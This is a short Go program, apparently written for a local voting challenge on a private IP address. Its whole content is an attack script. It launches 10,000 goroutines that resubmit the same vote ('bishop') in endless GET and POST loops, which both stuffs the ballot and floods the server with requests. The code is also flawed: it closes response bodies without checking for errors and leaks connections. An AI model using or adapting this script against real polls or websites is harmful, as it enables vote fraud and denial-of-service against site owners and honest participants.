package main

import (
	"fmt"
	"net/http"
	"net/url"
)

func votePost() {
	for {
		host := "http://192.168.0.14/Voting_Challenge.html"
		resp, err := http.PostForm(host,
			url.Values{ "name": {"bishop"}, "email": {"a11Id01sW1n@gmail.com"}} )
		
		if err != nil {
			fmt.Println(err)
		}
		
		resp.Body.Close()
	}
}

func voteGet() {
	host := "http://192.168.0.14/welcome_get.php?name=bishop&email=a11Id01sW1n@gmail.com"
	for {
		resp, err := http.Get(host)
		
		if err != nil {
			fmt.Println(err)
		}
		
		resp.Body.Close()
	}
}

func voteGetFast() {
	host := "http://192.168.0.14/welcome_get.php?name=bishop&email=a11Id01sW1n@gmail.com"
	for {
		http.Get(host)
	}
}

func main(){
	for i:= 0; i < 10000; i++ {
		fmt.Println("Starting thread " , i)
		go voteGetFast()
	}
	for {

	}
}
